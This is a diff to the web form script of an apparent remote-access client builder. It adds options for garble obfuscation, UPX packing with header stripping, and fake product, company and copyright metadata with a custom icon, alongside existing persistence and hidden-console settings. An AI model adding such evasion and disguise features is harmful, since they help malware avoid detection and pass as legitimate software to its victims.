@@ -91,6 +91,64 @@ if (persistenceCheckbox && persistenceMethodContainer) {
   });
 }
 
+const obfuscateCheckbox = document.querySelector('input[name="obfuscate"]');
+const garbleSettingsContainer = document.getElementById("garble-settings-container");
+if (obfuscateCheckbox && garbleSettingsContainer) {
+  obfuscateCheckbox.addEventListener("change", () => {
+    if (obfuscateCheckbox.checked) {
+      garbleSettingsContainer.classList.remove("hidden");
+    } else {
+      garbleSettingsContainer.classList.add("hidden");
+    }
+  });
+}
+
+const upxCheckbox = document.querySelector('input[name="enable-upx"]');
+const upxSettingsContainer = document.getElementById("upx-settings-container");
+if (upxCheckbox && upxSettingsContainer) {
+  upxCheckbox.addEventListener("change", () => {
+    if (upxCheckbox.checked) {
+      upxSettingsContainer.classList.remove("hidden");
+    } else {
+      upxSettingsContainer.classList.add("hidden");
+    }
+  });
+}
+
+let pendingIconBase64 = null;
+const iconUpload = document.getElementById("icon-upload");
+const iconLabel = document.getElementById("icon-label");
+const iconClear = document.getElementById("icon-clear");
+
+if (iconUpload) {
+  iconUpload.addEventListener("change", () => {
+    const file = iconUpload.files[0];
+    if (!file) return;
+    if (file.size > 1024 * 1024) {
+      alert("Icon file must be under 1MB");
+      iconUpload.value = "";
+      return;
+    }
+    const reader = new FileReader();
+    reader.onload = () => {
+      const base64 = reader.result.split(",")[1];
+      pendingIconBase64 = base64;
+      if (iconLabel) iconLabel.textContent = file.name;
+      if (iconClear) iconClear.classList.remove("hidden");
+    };
+    reader.readAsDataURL(file);
+  });
+}
+
+if (iconClear) {
+  iconClear.addEventListener("click", () => {
+    pendingIconBase64 = null;
+    if (iconUpload) iconUpload.value = "";
+    if (iconLabel) iconLabel.textContent = "Choose .ico file";
+    iconClear.classList.add("hidden");
+  });
+}
+
 async function init() {
   try {
     updateServerUrlPlaceholder();
@@ -215,6 +273,16 @@ form?.addEventListener("submit", async (e) => {
     'input[name="no-printing"]',
   ).checked;
 
+  const outputNameVal = form.querySelector("#output-name")?.value.trim() || "";
+  const garbleLiterals = form.querySelector('input[name="garble-literals"]')?.checked || false;
+  const garbleTiny = form.querySelector('input[name="garble-tiny"]')?.checked || false;
+  const garbleSeedVal = form.querySelector("#garble-seed")?.value.trim() || "";
+  const assemblyTitle = form.querySelector("#assembly-title")?.value.trim() || "";
+  const assemblyProduct = form.querySelector("#assembly-product")?.value.trim() || "";
+  const assemblyCompany = form.querySelector("#assembly-company")?.value.trim() || "";
+  const assemblyVersion = form.querySelector("#assembly-version")?.value.trim() || "";
+  const assemblyCopyright = form.querySelector("#assembly-copyright")?.value.trim() || "";
+
   const buildConfig = {
     platforms,
     serverUrl: serverUrl || undefined,
@@ -228,6 +296,18 @@ form?.addEventListener("submit", async (e) => {
     persistenceMethod: enablePersistence ? persistenceMethod : undefined,
     hideConsole,
     noPrinting,
+    outputName: outputNameVal || undefined,
+    garbleLiterals: obfuscate ? garbleLiterals : undefined,
+    garbleTiny: obfuscate ? garbleTiny : undefined,
+    garbleSeed: obfuscate && garbleSeedVal ? garbleSeedVal : undefined,
+    assemblyTitle: assemblyTitle || undefined,
+    assemblyProduct: assemblyProduct || undefined,
+    assemblyCompany: assemblyCompany || undefined,
+    assemblyVersion: assemblyVersion || undefined,
+    assemblyCopyright: assemblyCopyright || undefined,
+    iconBase64: pendingIconBase64 || undefined,
+    enableUpx: form.querySelector('input[name="enable-upx"]')?.checked || false,
+    upxStripHeaders: form.querySelector('input[name="upx-strip-headers"]')?.checked || false,
   };
 
   const hasAndroid = platforms.some(p => p.startsWith('android-'));
